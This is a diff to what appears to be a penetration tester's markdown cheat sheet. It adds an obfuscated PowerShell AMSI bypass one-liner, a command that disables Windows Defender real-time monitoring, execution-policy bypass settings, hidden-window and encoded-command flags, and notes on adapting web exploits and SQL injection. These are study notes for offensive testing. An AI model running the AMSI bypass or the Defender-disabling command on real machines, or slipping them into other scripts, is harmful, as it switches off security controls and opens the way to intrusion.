@@ -27,10 +27,37 @@ When receiving the error “/usr/bin/env: ‘python\r’: No such file or direct
 2.	Use the command “:set ff=unix”
 3.	Save the file. “:wq”
 
-### Powershell flags
-- -nop: (-noprofile) which instructs powershell not to load the powershell user profile.
--	-w hidden: to avoid creating a window on the user’s desktop
--	-e: (-EncodedCommand) use base64 encoding
+## Powershell
+#### Powershell flags
+- ```-nop```: (-noprofile) which instructs powershell not to load the powershell user profile.
+-	```-w hidden```: to avoid creating a window on the user’s desktop
+-	```-e```: (```-EncodedCommand```) use base64 encoding
+
+#### AMSI Bypass
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+#### Disbale AV (Requires local admin)
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### Powershell execution policy
+#### Get execution policy
+```
+Get-ExecutionPolicy -Scope CurrentUser
+```
+
+#### Bypass execution policy flag
+```
+-ExecutionPolicy Bypass
+```
+
+#### Disable execution policy
+```
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
 
 #### EXAMPLE COMMANDO
 ```
@@ -357,7 +384,18 @@ curl -v -X OPTIONS http://website/directory
 ```
 
 # Exploitation
-## SQL Injection
+## Web application
+### General
+When modifying web exploits, there are several key questions we generally need to ask while approaching the code:
+-	Does it initiate an HTTP or HTTPS connection?
+-	Does it access a web application specific path or route?
+-	Does the exploit leverage a pre-authentication vulnerability?
+-	If not, how does the exploit authenticate to the web application?
+-	How are the GET or POST requests crafted to trigger and exploit the vulnerability?
+-	Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
+-	Will oddities such as self-signed certificates disrupt the exploit?
+
+### SQL Injection
 - Use ‘ and “ to look for possible errors
 - use # and -- for comments after the injection.
 - If returning multiple rows gives errors use ```LIMIT 1``` in the query
